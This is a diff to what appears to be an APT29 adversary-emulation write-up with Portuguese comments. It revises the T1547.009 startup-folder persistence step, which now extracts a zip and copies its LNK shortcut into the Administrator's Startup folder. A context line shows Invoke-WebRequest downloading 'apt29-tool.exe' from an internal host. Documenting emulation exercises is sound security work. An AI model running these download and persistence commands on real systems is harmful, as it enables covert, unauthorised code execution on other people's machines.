@@ -285,8 +285,11 @@ Invoke-WebRequest -Uri "http://192.168.10.102:8080/apt29-tool.exe" -OutFile "C:\
 ### T1547.009 — Startup Folder Persistence
 
 ```powershell
-Copy-Item "C:\Users\Public\payload.lnk" `
-  "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+# Extrair o zip
+Expand-Archive -Path "C:\Users\Administrator\Downloads\ds7002.zip" -DestinationPath "C:\Users\Administrator\Downloads\ds7002\" -Force
+
+# Copiar o LNK para Startup
+Copy-Item "C:\Users\Administrator\Downloads\ds7002\ds7002.lnk" "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 ```
 
 **Evidência:**
